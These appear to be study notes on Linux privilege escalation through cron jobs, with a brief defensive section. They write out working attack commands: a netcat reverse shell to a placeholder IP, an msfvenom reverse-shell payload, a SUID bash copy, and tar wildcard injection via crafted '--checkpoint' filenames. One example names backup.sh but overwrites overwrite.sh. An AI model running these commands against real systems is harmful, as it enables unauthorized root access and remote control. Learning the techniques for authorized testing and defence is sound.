## 📝 Linux PrivEsc Notes: Cron Job Exploitation

---

## Core Concept

A **cron job** is a background service in Linux that automatically runs tasks at fixed intervals (every minute, hourly, daily, etc.).

If a cron job runs with **root privileges** and has a weakness, it can be abused to gain a **root shell**.

---

# 🔍 Part 1: Detecting Cron Jobs

---

## 1. `/etc/crontab` Inspection

```bash
cat /etc/crontab
```

### Cron Format:
```
Minute Hour Day Month Week User Command
```

Example:
```
* * * * * root /path/to/script.sh
```

### Meaning:
- Runs every minute
- Executes as **root**
- Executes specified script

---

## 2. File Monitoring (Indirect Method)

If you cannot read cron config:

```bash
ls -l /opt
ls -l /tmp
```

### What to look for:
- Files updating every minute
- Unexpected modification timestamps
- Repeated changes in scripts

---

## 3. `pspy` Tool (Advanced Method 🔥)

`pspy` monitors processes in real-time without root access.

### Steps:

```bash
wget <pspy_binary>
chmod +x pspy64
./pspy64
```

### What it shows:
- Live process execution
- Cron-triggered commands
- UID (root = 0)

---

# 🔓 Part 2: Cron Exploitation Techniques

---

# Method 1: Weak File Permissions

---

## Condition

Cron runs a script like:

```bash
/root/backup.sh
```

But file is writable:

```bash
ls -la backup.sh
```

---

## Exploitation

### Inject reverse shell:

```bash
echo "nc -e /bin/sh YOUR_IP 4444" > overwrite.sh
```

---

## Listener:

```bash
nc -nvlp 4444
```

---

## Result:
- Cron executes script as root
- Reverse shell connects back
- Root access achieved

---

# Method 2: PATH Hijacking

---

## Condition

Cron job:

```bash
overwrite.sh
```

(No full path given)

---

## Exploitation Steps

### Step 1: Create malicious script

```bash
nano overwrite.sh
```

### Payload:

```bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```

---

### Step 2: Make executable

```bash
chmod +x overwrite.sh
```

---

### Step 3: Wait for cron execution

---

## Result:

```bash
/tmp/bash -p
```

### Outcome:
- SUID bash shell
- Root privileges

---

# Method 3: TAR Wildcard Injection (Advanced 💣)

---

## Condition

Cron job:

```bash
tar -czvf backup.tar.gz *
```

---

## Vulnerability

- `*` expands all files
- tar interprets filenames as arguments
- attacker injects fake flags

---

## Exploitation Steps

---

### Step 1: Create reverse shell binary

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf
```

```bash
chmod +x shell.elf
```

---

### Step 2: Create malicious filenames

```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=shell.elf"
```

---

### Step 3: Start listener

```bash
nc -nvlp 4444
```

---

## Attack Flow

- `tar` runs with wildcard `*`
- filenames become command arguments
- `--checkpoint-action` triggers execution
- `shell.elf` runs as root

---

## Result:

```bash
whoami
root
```

---

# 🧠 Key Takeaways

---

## Common Cron Vulnerabilities

- Weak file permissions
- Missing absolute paths
- Unsafe wildcard usage
- Writable scripts

---

## Defensive Practices

### 1. Use absolute paths

```bash
/usr/bin/tar
```

---

### 2. Secure permissions

```bash
chmod 700 script.sh
```

---

### 3. Avoid wildcard abuse

- Do not use `*` in privileged scripts
- Validate input filenames

---

### 4. Monitor cron jobs

- Use logging tools
- Use integrity checkers

---

# ⚡ Summary Table

| Method | Type | Difficulty | Impact |
|--------|------|------------|--------|
| Weak permissions | File overwrite | Easy | Root shell |
| PATH hijacking | Environment abuse | Medium | Root shell |
| TAR wildcard | Argument injection | Hard | Root shell |

---

# 🧠 Final Insight

Cron jobs are **silent privilege escalators**.

If anything executed by root is:
- writable  
- misconfigured  
- or relies on unsafe assumptions  

→ it can become a full system takeover path.

---
